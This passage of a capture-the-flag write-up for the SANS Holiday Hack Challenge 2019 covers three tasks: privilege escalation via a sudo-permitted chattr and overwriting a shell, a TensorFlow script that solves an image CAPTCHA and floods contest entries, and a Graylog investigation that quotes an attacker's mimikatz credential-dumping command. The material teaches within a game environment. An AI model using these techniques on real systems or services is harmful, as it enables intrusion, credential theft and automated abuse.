<p>Hmm, it didn't work. Even if the file is <code>chmod 777</code>, we can't modify it.
This looks like its <a class="reference external" href="https://wiki.archlinux.org/index.php/File_permissions_and_attributes#File_attributes">attributes</a>
were modified:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@af7e11560ac9:~$</span> lsattr /bin/nsh
<span class="go">----i---------e---- /bin/nsh</span>
</pre></div>
<p>Indeed, the <code>i</code> flag means that the file is <strong>immutable</strong>. As the
<code>elf</code> user, we can't modify <code>/bin/nsh</code>'s attributes, because it
belongs to <code>root</code>. Can we execute command as <code>root</code>? Let's take a
look at our <code>sudo</code> abilities:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@af7e11560ac9:~$</span> sudo -l
<span class="go">Matching Defaults entries for elf on af7e11560ac9:</span>
<span class="go">    env_reset, mail_badpass,</span>
<span class="go">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>

<span class="go">User elf may run the following commands on af7e11560ac9:</span>
<span class="hll"><span class="go">    (root) NOPASSWD: /usr/bin/chattr</span>
</span></pre></div>
<p>Yes, we can run <code>chattr</code>, which allows us to remove the immutable file
from <code>/bin/nsh</code>, and then modify its content:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@af7e11560ac9:~$</span> sudo chattr -i /bin/nsh
<span class="gp">elf@af7e11560ac9:~$</span> lsattr /bin/nsh
<span class="go">--------------e---- /bin/nsh</span>
<span class="gp">elf@af7e11560ac9:~$</span> cp /bin/bash /bin/nsh
</pre></div>
<p>We can now log into Alabaster's account, which will drop us into a <code>bash</code>
prompt:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@af7e11560ac9:~$</span> su alabaster_snowball
<span class="go">Password:</span>
<span class="go">Loading, please wait......</span>



<span class="go">You did it! Congratulations!</span>

<span class="gp">alabaster_snowball@af7e11560ac9:/home/elf$</span>
</pre></div>
</div>
<div class="section" id="bypassing-the-frido-sleigh-capteha">
<h3><a class="toc-backref" href="#id30">Bypassing the Frido Sleigh CAPTEHA</a></h3>
<p>So, Krampus wants us to help him win the <a class="reference external" href="https://fridosleigh.com/">Frido Sleigh</a>
contest. But to do so, we need to bypass the <a class="reference external" href="https://en.wikipedia.org/wiki/CAPTCHA">CAPTEHA</a>,
or &quot;Completely Automated Public Turing test to tell Elves and Humans Apart&quot;.
You see, only elves can enter the contest.</p>
<img alt="capteha_fail.gif" class="align-center" src="/images/sans-christmas-challenge-2019/capteha_fail.gif" />
<p>As you can see, the CAPTEHA is pretty hard. We're given 100 images, and we have
five seconds to select every image from three categories. Feasible for an elf,
but not a human.</p>
<p>Luckily, Krampus gave us an archive of <a class="reference external" href="https://downloads.elfu.org/capteha_images.tar.gz">12,000 images</a>
that are properly categorized, and a <a class="reference external" href="/docs/sans-christmas-challenge-2019/capteha_api.py">Python script</a>
to interact with the website API. We can use these images to create a Machine
Learning model, so that our Python script can answer the CAPTEHA in our place.</p>
<p>Now, I don't know anything about Machine Learning. Luckily, there's a
<a class="reference external" href="https://www.youtube.com/watch?v=jmVPLwjm_zs">conference on the subject</a>
right here at KringleCon! Be sure to give it a look, it's pretty interesting.</p>
<p>As Chris suggests in his talk, I'm going to use <a class="reference external" href="https://www.tensorflow.org/">TensorFlow</a>
to create a model to solve our CAPTEHA. I was first going to use the <a class="reference external" href="https://github.com/tensorflow/hub/tree/master/examples/image_retraining">retrain.py</a>
mentioned in the talk, however, it seems to have been deprecated in favor of
<a class="reference external" href="https://github.com/tensorflow/hub/tree/master/tensorflow_hub/tools/make_image_classifier">make_image_classifier</a>.
So let's use this script instead:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> make_image_classifier --image_dir ./capteha_images --tfhub_module https://tfhub.dev/google/tf2-preview/mobilenet_v2/feature_vector/4 --saved_model_dir capteha_model --labels_output_file capteha_labels.txt --tflite_output_file capteha_lite_model --batch_size <span class="m">16</span>
<span class="go">I1231 13:03:54.815997 140094772307776 resolver.py:79] Using /tmp/tfhub_modules to cache modules.</span>
<span class="go">2019-12-31 13:03:55.051043: I tensorflow/core/platform/cpu_feature_guard.cc:142] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA</span>
<span class="go">2019-12-31 13:03:55.086432: I tensorflow/core/platform/profile_utils/cpu_utils.cc:94] CPU Frequency: 1992000000 Hz</span>
<span class="go">2019-12-31 13:03:55.088571: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x446a880 executing computations on platform Host. Devices:</span>
<span class="go">2019-12-31 13:03:55.088742: I tensorflow/compiler/xla/service/service.cc:175]   StreamExecutor device (0): Host, Default Version</span>
<span class="go">Using module https://tfhub.dev/google/tf2-preview/mobilenet_v2/feature_vector/4 with image size (224, 224)</span>
<span class="go">Found 2394 images belonging to 6 classes.</span>
<span class="go">Found 9582 images belonging to 6 classes.</span>
<span class="go">Found 6 classes: Candy Canes, Christmas Trees, Ornaments, Presents, Santa Hats, Stockings</span>
<span class="go">Model: &quot;sequential&quot;</span>
<span class="go">_________________________________________________________________</span>
<span class="go">Layer (type)                 Output Shape              Param #</span>
<span class="go">=================================================================</span>
<span class="go">keras_layer (KerasLayer)     multiple                  2257984</span>
<span class="go">_________________________________________________________________</span>
<span class="go">dropout (Dropout)            multiple                  0</span>
<span class="go">_________________________________________________________________</span>
<span class="go">dense (Dense)                multiple                  7686</span>
<span class="go">=================================================================</span>
<span class="go">Total params: 2,265,670</span>
<span class="go">Trainable params: 7,686</span>
<span class="go">Non-trainable params: 2,257,984</span>
<span class="go">_________________________________________________________________</span>
<span class="go">None</span>
<span class="go">Epoch 1/5</span>
<span class="go">598/598 [==============================] - 1073s 2s/step - loss: 0.5153 - accuracy: 0.9392 - val_loss: 0.4479 - val_accuracy: 0.9996</span>
<span class="go">Epoch 2/5</span>
<span class="go">598/598 [==============================] - 1071s 2s/step - loss: 0.4573 - accuracy: 0.9995 - val_loss: 0.4402 - val_accuracy: 0.9996</span>
<span class="go">Epoch 3/5</span>
<span class="go">598/598 [==============================] - 1075s 2s/step - loss: 0.4487 - accuracy: 1.0000 - val_loss: 0.4376 - val_accuracy: 0.9996</span>
<span class="go">Epoch 4/5</span>
<span class="go">598/598 [==============================] - 1076s 2s/step - loss: 0.4450 - accuracy: 1.0000 - val_loss: 0.4354 - val_accuracy: 0.9996</span>
<span class="go">Epoch 5/5</span>
<span class="go">598/598 [==============================] - 1081s 2s/step - loss: 0.4423 - accuracy: 1.0000 - val_loss: 0.4343 - val_accuracy: 0.9996</span>
<span class="go">Done with training.</span>
<span class="go">Labels written to capteha_labels.txt</span>
<span class="go">2019-12-31 14:33:36.474227: W tensorflow/python/util/util.cc:299] Sets are not currently considered sequences, but this may change in the future, so consider avoiding using them.</span>
<span class="go">WARNING:tensorflow:From /home/user/venv/tensorflow/lib/python3.6/site-packages/tensorflow_core/python/ops/resource_variable_ops.py:1781: calling BaseResourceVariable.__init__ (from tensorflow.python.ops.resource_variable_ops) with constraint is deprecated and will be removed in a future version.</span>
<span class="go">Instructions for updating:</span>
<span class="go">If using Keras pass *_constraint arguments to layers.</span>
<span class="go">W1231 14:33:37.121725 140094772307776 deprecation.py:506] From /home/user/venv/tensorflow/lib/python3.6/site-packages/tensorflow_core/python/ops/resource_variable_ops.py:1781: calling BaseResourceVariable.__init__ (from tensorflow.python.ops.resource_variable_ops) with constraint is deprecated and will be removed in a future version.</span>
<span class="go">Instructions for updating:</span>
<span class="go">If using Keras pass *_constraint arguments to layers.</span>
<span class="go">INFO:tensorflow:Assets written to: capteha_model/assets</span>
<span class="go">I1231 14:33:38.405297 140094772307776 builder_impl.py:771] Assets written to: capteha_model/assets</span>
<span class="go">SavedModel model exported to capteha_model</span>
<span class="go">2019-12-31 14:33:39.668104: W tensorflow/core/graph/graph_constructor.cc:761] Node &#39;StatefulPartitionedCall&#39; has 71 outputs but the _output_shapes attribute specifies shapes for 605 outputs. Output shapes may be inaccurate.</span>
<span class="go">2019-12-31 14:33:41.580706: I tensorflow/core/grappler/devices.cc:60] Number of eligible GPUs (core count &gt;= 8, compute capability &gt;= 0.0): 0 (Note: TensorFlow was not compiled with CUDA support)</span>
<span class="go">2019-12-31 14:33:41.580786: I tensorflow/core/grappler/clusters/single_machine.cc:356] Starting new session</span>
<span class="go">2019-12-31 14:33:41.672872: I tensorflow/core/grappler/optimizers/meta_optimizer.cc:716] Optimization results for grappler item: graph_to_optimize</span>
<span class="go">2019-12-31 14:33:41.672907: I tensorflow/core/grappler/optimizers/meta_optimizer.cc:718]   function_optimizer: Graph size after: 1905 nodes (1640), 3234 edges (2969), time = 43.177ms.</span>
<span class="go">2019-12-31 14:33:41.672913: I tensorflow/core/grappler/optimizers/meta_optimizer.cc:718]   function_optimizer: function_optimizer did nothing. time = 0.76ms.</span>
<span class="go">2019-12-31 14:33:42.822924: I tensorflow/core/grappler/devices.cc:60] Number of eligible GPUs (core count &gt;= 8, compute capability &gt;= 0.0): 0 (Note: TensorFlow was not compiled with CUDA support)</span>
<span class="go">2019-12-31 14:33:42.823025: I tensorflow/core/grappler/clusters/single_machine.cc:356] Starting new session</span>
<span class="go">2019-12-31 14:33:43.046835: I tensorflow/core/grappler/optimizers/meta_optimizer.cc:716] Optimization results for grappler item: graph_to_optimize</span>
<span class="go">2019-12-31 14:33:43.046868: I tensorflow/core/grappler/optimizers/meta_optimizer.cc:718]   constant folding: Graph size after: 790 nodes (-1042), 1855 edges (-1304), time = 156.762ms.</span>
<span class="go">2019-12-31 14:33:43.046878: I tensorflow/core/grappler/optimizers/meta_optimizer.cc:718]   constant folding: Graph size after: 790 nodes (0), 1855 edges (0), time = 26.732ms.</span>
<span class="go">TFLite model exported to capteha_lite_model</span>
</pre></div>
<p>I pretty much ran the tool with default parameters, as described in the README.
I did change the <code>--batch_size</code> argument to 16, instead of the default of
32, because the program consumed to much RAM and kept crashing. It was still
pretty close to total RAM consumption with these parameters. I left the program
running on my laptop for about 1h30, without any other programs running, and it
generated my model.</p>
<p>Now that we have our model, we need to call it in our <code>capteha_api.py</code>
file to categorize our different images. I took example on TensorFlow's own
<a class="reference external" href="https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/python/label_image.py">label_image.py</a>.</p>
<p>So here's the functions I created:</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">load_labels</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="sd">&#39;&#39;&#39;This functions load our different image categories (Candy Canes,</span>
<span class="sd">    Christmas Trees, Ornaments, Presents, Santa Hats, and  Stockings)&#39;&#39;&#39;</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="k">return</span> <span class="p">[</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()]</span>

<span class="k">def</span> <span class="nf">image_from_b64</span><span class="p">(</span><span class="n">b64_image</span><span class="p">):</span>
    <span class="sd">&#39;&#39;&#39;This function creates and image object from the base64 value sent by</span>
<span class="sd">    the Frido Sleigh server&#39;&#39;&#39;</span>
    <span class="n">img_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">b64_image</span><span class="p">[</span><span class="s1">&#39;base64&#39;</span><span class="p">])</span>
    <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">img_data</span><span class="p">))</span>

    <span class="k">return</span> <span class="n">img</span>

<span class="k">def</span> <span class="nf">categorize_image</span><span class="p">(</span><span class="n">interpreter</span><span class="p">,</span> <span class="n">labels</span><span class="p">,</span> <span class="n">img</span><span class="p">):</span>
    <span class="sd">&#39;&#39;&#39;This function takes an image and our machine learning model, and</span>
<span class="sd">    returns the label that matches the image the most&#39;&#39;&#39;</span>
    <span class="n">input_details</span> <span class="o">=</span> <span class="n">interpreter</span><span class="o">.</span><span class="n">get_input_details</span><span class="p">()</span>
    <span class="n">output_details</span> <span class="o">=</span> <span class="n">interpreter</span><span class="o">.</span><span class="n">get_output_details</span><span class="p">()</span>

    <span class="n">input_data</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">expand_dims</span><span class="p">(</span><span class="n">img</span><span class="p">,</span> <span class="n">axis</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">input_data</span> <span class="o">=</span> <span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">float32</span><span class="p">(</span><span class="n">input_data</span><span class="p">)</span> <span class="o">-</span> <span class="mf">127.5</span><span class="p">)</span> <span class="o">/</span> <span class="mf">127.5</span>

    <span class="n">interpreter</span><span class="o">.</span><span class="n">set_tensor</span><span class="p">(</span><span class="n">input_details</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;index&#39;</span><span class="p">],</span> <span class="n">input_data</span><span class="p">)</span>

    <span class="n">interpreter</span><span class="o">.</span><span class="n">invoke</span><span class="p">()</span>

    <span class="n">output_data</span> <span class="o">=</span> <span class="n">interpreter</span><span class="o">.</span><span class="n">get_tensor</span><span class="p">(</span><span class="n">output_details</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;index&#39;</span><span class="p">])</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">squeeze</span><span class="p">(</span><span class="n">output_data</span><span class="p">)</span>
    <span class="n">top_result</span> <span class="o">=</span> <span class="n">results</span><span class="o">.</span><span class="n">argsort</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

    <span class="k">return</span> <span class="n">labels</span><span class="p">[</span><span class="n">top_result</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">yourREALemailAddress</span> <span class="o">=</span> <span class="s2">&quot;&lt;you_should_put_your_real_mail@here.com&gt;&quot;</span>

    <span class="c1"># Preparing Tensorflow information. Since it takes some time to load,</span>
    <span class="c1"># we load it before calling the API.</span>
    <span class="n">labels</span> <span class="o">=</span> <span class="n">load_labels</span><span class="p">(</span><span class="s1">&#39;./capteha_labels.txt&#39;</span><span class="p">)</span>
    <span class="n">interpreter</span> <span class="o">=</span> <span class="n">tf</span><span class="o">.</span><span class="n">lite</span><span class="o">.</span><span class="n">Interpreter</span><span class="p">(</span><span class="n">model_path</span><span class="o">=</span><span class="s1">&#39;./capteha_lite_model&#39;</span><span class="p">)</span>
    <span class="n">interpreter</span><span class="o">.</span><span class="n">allocate_tensors</span><span class="p">()</span>

    <span class="c1"># Creating a session to handle cookies</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;https://fridosleigh.com/&quot;</span>

    <span class="c1"># Getting information from the Frido Seligh website</span>
    <span class="n">json_resp</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;{}api/capteha/request&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="p">))</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="n">b64_images</span> <span class="o">=</span> <span class="n">json_resp</span><span class="p">[</span><span class="s1">&#39;images&#39;</span><span class="p">]</span>                    <span class="c1"># A list of dictionaries eaching containing the keys &#39;base64&#39; and &#39;uuid&#39;</span>
    <span class="n">challenge_image_type</span> <span class="o">=</span> <span class="n">json_resp</span><span class="p">[</span><span class="s1">&#39;select_type&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>     <span class="c1"># The Image types the CAPTEHA Challenge is looking for.</span>
    <span class="n">challenge_image_types</span> <span class="o">=</span> <span class="p">[</span><span class="n">challenge_image_type</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="n">challenge_image_type</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="n">challenge_image_type</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; and &#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()]</span> <span class="c1"># cleaning and formatting</span>

    <span class="n">uuid_results</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>

    <span class="c1"># Categorizing images</span>
    <span class="k">for</span> <span class="n">b64_image</span> <span class="ow">in</span> <span class="n">b64_images</span><span class="p">:</span>
        <span class="n">img_category</span> <span class="o">=</span> <span class="n">categorize_image</span><span class="p">(</span><span class="n">interpreter</span><span class="p">,</span> <span class="n">labels</span><span class="p">,</span> <span class="n">image_from_b64</span><span class="p">(</span><span class="n">b64_image</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">img_category</span> <span class="ow">in</span> <span class="n">challenge_image_types</span><span class="p">:</span>
            <span class="n">uuid_results</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">b64_image</span><span class="p">[</span><span class="s1">&#39;uuid&#39;</span><span class="p">])</span>

    <span class="c1"># This should be JUST a csv list image uuids ML predicted to match the challenge_image_type .</span>
    <span class="n">final_answer</span> <span class="o">=</span> <span class="s1">&#39;,&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">uuid_results</span><span class="p">)</span>

    <span class="c1"># [...] the rest of the file is the same as Krampus&#39;</span>
</pre></div>
<p>Alright, we have everything we need: we load our model, get the different
images, categorize them using our model, and select only the images in
categories asked by the CAPTEHA. Let's launch our script:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> ./capteha_api.py
<span class="go">INFO: Initialized TensorFlow Lite runtime.</span>
<span class="go">Traceback (most recent call last):</span>
<span class="go">  File &quot;./capteha_api.py&quot;, line 109, in &lt;module&gt;</span>
<span class="go">    main()</span>
<span class="go">  File &quot;./capteha_api.py&quot;, line 73, in main</span>
<span class="go">    img_category = categorize_image(interpreter, labels, image_from_b64(b64_image))</span>
<span class="go">  File &quot;./capteha_api.py&quot;, line 41, in categorize_image</span>
<span class="go">    interpreter.set_tensor(input_details[0][&#39;index&#39;], input_data)</span>
<span class="go">  File &quot;/home/user/venv/tensorflow/lib/python3.6/site-packages/tensorflow_core/lite/python/interpreter.py&quot;, line 346, in set_tensor</span>
<span class="go">    self._interpreter.SetTensor(tensor_index, value)</span>
<span class="go">  File &quot;/home/user/venv/tensorflow/lib/python3.6/site-packages/tensorflow_core/lite/python/interpreter_wrapper/tensorflow_wrap_interpreter_wrapper.py&quot;, line 136, in SetTensor</span>
<span class="go">    return _tensorflow_wrap_interpreter_wrapper.InterpreterWrapper_SetTensor(self, i, value)</span>
<span class="hll"><span class="go">ValueError: Cannot set tensor: Dimension mismatch. Got 112 but expected 224 for dimension 1 of input 175.</span>
</span></pre></div>
<p>We get an error... The message says that there's a dimension mismatch, and that
our script expected a dimension of 224. If we take a look at Krampus' image
catalogue, we can see that every image has a size of 224 x 224 pixels. If we
give an image that does not have the same size, it can't use our model to try
and categorize it. So, let's modify our code to resize every CAPTEHA image to
be 224 x 224:</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">image_from_b64</span><span class="p">(</span><span class="n">b64_image</span><span class="p">):</span>
    <span class="n">img_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">b64_image</span><span class="p">[</span><span class="s1">&#39;base64&#39;</span><span class="p">])</span>
    <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">img_data</span><span class="p">))</span>
<span class="hll">    <span class="n">img</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="n">resize</span><span class="p">((</span><span class="mi">224</span><span class="p">,</span> <span class="mi">224</span><span class="p">))</span>
</span>
    <span class="k">return</span> <span class="n">img</span>
</pre></div>
<p>Alright, let's relaunch our script:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> ./capteha_api.py
<span class="go">INFO: Initialized TensorFlow Lite runtime.</span>
<span class="go">Traceback (most recent call last):</span>
<span class="go">  File &quot;./capteha_api.py&quot;, line 110, in &lt;module&gt;</span>
<span class="go">    main()</span>
<span class="go">  File &quot;./capteha_api.py&quot;, line 74, in main</span>
<span class="go">    img_category = categorize_image(interpreter, labels, image_from_b64(b64_image))</span>
<span class="go">  File &quot;./capteha_api.py&quot;, line 42, in categorize_image</span>
<span class="go">    interpreter.set_tensor(input_details[0][&#39;index&#39;], input_data)</span>
<span class="go">  File &quot;/home/user/venv/tensorflow/lib/python3.6/site-packages/tensorflow_core/lite/python/interpreter.py&quot;, line 346, in set_tensor</span>
<span class="go">    self._interpreter.SetTensor(tensor_index, value)</span>
<span class="go">  File &quot;/home/user/venv/tensorflow/lib/python3.6/site-packages/tensorflow_core/lite/python/interpreter_wrapper/tensorflow_wrap_interpreter_wrapper.py&quot;, line 136, in SetTensor</span>
<span class="go">    return _tensorflow_wrap_interpreter_wrapper.InterpreterWrapper_SetTensor(self, i, value)</span>
<span class="hll"><span class="go">ValueError: Cannot set tensor: Dimension mismatch. Got 4 but expected 3 for dimension 3 of input 175.</span>
</span></pre></div>
<p>Hmm, still this dimension mismatch error message. However, the first one talked
about &quot;dimension 1&quot;. This one talks about &quot;dimension 3&quot;. We're talking about
images: dimension 1 must be the height, dimension 2 the witdh. What can
dimension 3 be? Since we're manipulating <a class="reference external" href="https://en.wikipedia.org/wiki/Portable_Network_Graphics">PNG images</a>,
there's an <a class="reference external" href="https://en.wikipedia.org/wiki/Alpha_compositing">alpha channel</a>,
used to encode the transparency of the background.</p>
<p>I decided to remove the transparent background from the image. I used <a class="reference external" href="https://stackoverflow.com/a/9459208">this
StackOverflow's answer</a> to see how to
do it using <a class="reference external" href="https://www.pythonware.com/products/pil/">PIL</a>. Here's our new
code:</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">image_from_b64</span><span class="p">(</span><span class="n">b64_image</span><span class="p">):</span>
    <span class="n">img_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">b64_image</span><span class="p">[</span><span class="s1">&#39;base64&#39;</span><span class="p">])</span>
    <span class="n">first_img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">img_data</span><span class="p">))</span>

<span class="hll">    <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;RGB&#39;</span><span class="p">,</span> <span class="n">first_img</span><span class="o">.</span><span class="n">size</span><span class="p">,</span> <span class="p">(</span><span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">))</span>
</span><span class="hll">    <span class="n">img</span><span class="o">.</span><span class="n">paste</span><span class="p">(</span><span class="n">first_img</span><span class="p">,</span> <span class="n">mask</span><span class="o">=</span><span class="n">first_img</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">3</span><span class="p">])</span>
</span>    <span class="n">img</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="n">resize</span><span class="p">((</span><span class="mi">224</span><span class="p">,</span> <span class="mi">224</span><span class="p">))</span>

    <span class="k">return</span> <span class="n">img</span>
</pre></div>
<p>Now, this means that our CAPTEHA images do not have a transparent background
anymore, whereas the catalogue images we used to train our model did. This
might make our Machine Learning model a little bit unreliable. We could modify
our catalogue images to remove the alpha channel, and retrain our model. I
opted to try with my initial model, because I was to impatient to train another
model.</p>
<p>Sure enough, my model was not the most precise, and I had to try a couple of
times. But after four or five tries, my script correctly solved the CAPTEHA:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> ./capteha_api.py
<span class="go">INFO: Initialized TensorFlow Lite runtime.</span>
<span class="go">CAPTEHA Solved!</span>
<span class="go">Submitting lots of entries until we win the contest! Entry #1</span>
<span class="go">Submitting lots of entries until we win the contest! Entry #2</span>
<span class="go">Submitting lots of entries until we win the contest! Entry #3</span>
<span class="go">[...]</span>
<span class="go">Submitting lots of entries until we win the contest! Entry #103</span>
<span class="go">Submitting lots of entries until we win the contest! Entry #104</span>
<span class="go">{&quot;data&quot;:&quot;&lt;h2 id=\&quot;result_header\&quot;&gt; Entries for email address [REDACTED] no longer accepted as our systems show your email was already randomly selected as a winner! Go check your email to get your winning code. Please allow up to 3-5 minutes for the email to arrive in your inbox or check your spam filter settings. &lt;br&gt;&lt;br&gt; Congratulations and Happy Holidays!&lt;/h2&gt;&quot;,&quot;request&quot;:true}</span>
</pre></div>
<p>Few seconds later, I receive an email:</p>
<img alt="frido_sleigh_mail.png" class="align-center" src="/images/sans-christmas-challenge-2019/frido_sleigh_mail.png" />
<p>We managed to win the contest for Krampus!</p>
</div>
</div>
<div class="section" id="objective-9">
<h2><a class="toc-backref" href="#id31">Objective 9:</a></h2>
<div class="section" id="pepper-minstix-s-cranberry-pi-challenge">
<h3><a class="toc-backref" href="#id32">Pepper Minstix's Cranberry Pi Challenge</a></h3>
<p>We must take a look at logs in Graylog to find weird events and answer
questions.</p>
<ol class="arabic simple">
<li>Minty CandyCane reported some weird activity on his computer after he
clicked on a link in Firefox for a cookie recipe and downloaded a file. What
is the full-path + filename of the first malicious file downloaded by Minty?</li>
</ol>
<p>Let's search events with <code>UserAccount:minty</code>. Luckily, one of the <a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;fields=source%2CCommandLine%2Cmessage&amp;width=1853&amp;highlightMessage=&amp;relative=0&amp;q=UserAccount%3Aminty">first
results</a>
looks like a malicious file, <code>C:\Users\minty\Downloads\cookie_recipe.exe</code>.</p>
<ol class="arabic simple" start="2">
<li>The malicious file downloaded and executed by Minty gave the attacker remote
access to his machine. What was the <strong>ip:port</strong> the malicious file connected
to first?</li>
</ol>
<p>Now, we can look for <code>cookie_recipe.exe</code> and events with a
<code>DestinationIp</code> attribute. <a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;fields=source%2CCommandLine%2Cmessage&amp;width=1853&amp;highlightMessage=&amp;relative=0&amp;q=cookie_recipe.exe%20AND%20UserAccount%3Aminty%20AND%20_exists_%3ADestinationIp">This query</a>
has only one result. The <code>ip:port</code> is <code>192.168.247.175:4444</code>.</p>
<ol class="arabic simple" start="3">
<li>What was the first command executed by the attacker?</li>
</ol>
<p>If we keep looking for <code>cookie_recipe.exe</code>, we can <a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;fields=source%2CCommandLine%2Cmessage&amp;width=1853&amp;highlightMessage=&amp;relative=0&amp;q=cookie_recipe.exe">see</a> the commands launched by the
attacker. The first one is <code>whoami</code>.</p>
<ol class="arabic simple" start="4">
<li>What is the one-word service name the attacker used to escalate privileges?</li>
</ol>
<p>Still looking at <code>cookie_recipe.exe</code>, we see the interaction with a
Windows service with the <code>sc</code> command. The service is called
<code>webexservice</code>.</p>
<ol class="arabic simple" start="5">
<li>What is the file-path + filename of the binary ran by the attacker to dump credentials?</li>
</ol>
<p>If we take a look at the <code>webexservice</code> service, we can
<a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;fields=source%2CCommandLine%2Cmessage&amp;width=1853&amp;highlightMessage=&amp;relative=0&amp;q=webexservice">see</a>
the creation of another executable, <code>cookie_recipe2.exe</code>. Let's look for
this executable. The
<a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;fields=source%2CCommandLine%2Cmessage&amp;width=1853&amp;highlightMessage=&amp;relative=0&amp;q=cookie_recipe2.exe">results</a>
show that the attacker downloaded <code>mimikatz</code> from <a class="reference external" href="https://github.com/gentilkiwi">gentilkiwi's GitHub
repository</a>.</p>
<p>Let's look for <code>mimikatz</code>. The
<a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;fields=source%2CCommandLine%2Cmessage&amp;width=1853&amp;highlightMessage=&amp;relative=0&amp;q=mimikatz">results</a>
show that a command line <code>&quot;C:\cookie.exe&quot; privilege::debug sekurlsa::logonpasswords exit</code>
was launched. The <code>mimikatz</code> executable was therefore saved under
<code>C:\cookie.exe</code>.</p>
<ol class="arabic simple" start="6">
<li>The attacker pivoted to another workstation using credentials gained from
Minty's computer. Which account name was used to pivot to another machine?</li>
</ol>
<p>Now, we know the attacker's IP is <code>192.168.247.175</code>. We also know from
the analysis of the password spraying attack, that the Event ID for a correct
authentication is 4624. Let's look for this Event ID, tied to this IP address.
The
<a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;fields=source%2CCommandLine%2CLogonType%2Cmessage&amp;width=1853&amp;highlightMessage=&amp;relative=0&amp;q=EventID%3A4624%20AND%20192.168.247.175">results</a>
all have the same <code>AccountName</code> attribute, <code>alabaster</code>.</p>
<ol class="arabic simple" start="7">
